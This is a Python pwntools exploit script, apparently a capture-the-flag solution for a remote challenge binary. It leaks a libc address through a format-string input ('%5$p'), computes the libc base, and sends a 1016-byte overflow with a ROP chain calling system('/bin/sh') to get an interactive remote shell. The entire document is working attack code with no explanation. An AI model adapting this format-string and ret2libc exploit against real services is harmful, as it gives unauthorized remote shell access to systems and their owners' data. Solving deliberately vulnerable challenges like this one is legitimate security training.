from pwn import *

elf = context.binary = ELF("./chall")
# p = process()  # Change to remote() when testing remotely
p = remote("52.59.124.14",5020)
offset = 1016  # Ensure this is correct

# Leak libc address
p.sendline("yay")
p.sendline("%5$p")
p.recvuntil(b"email provided: ")
leak = int(p.recvline().strip(), 16)

# Compute libc base address
libc = ELF("./libc.so.6")  # Correctly use libc instead of elf.libc
libc.address = leak - libc.sym['_IO_2_1_stdin_']

# Find system and "/bin/sh"
system_addr = p64(libc.sym['system'])
bin_sh = p64(next(libc.search(b"/bin/sh")))

# Find pop rdi dynamically
rop = ROP(libc)  # Use libc instead of elf
pop_rdi = p64(rop.find_gadget(["pop rdi", "ret"])[0])
ret = p64(rop.find_gadget(["ret"])[0])

# Construct payload
payload = b"A" * offset + pop_rdi + bin_sh + ret + system_addr + p64(0x0)

p.sendline(payload)
p.interactive()
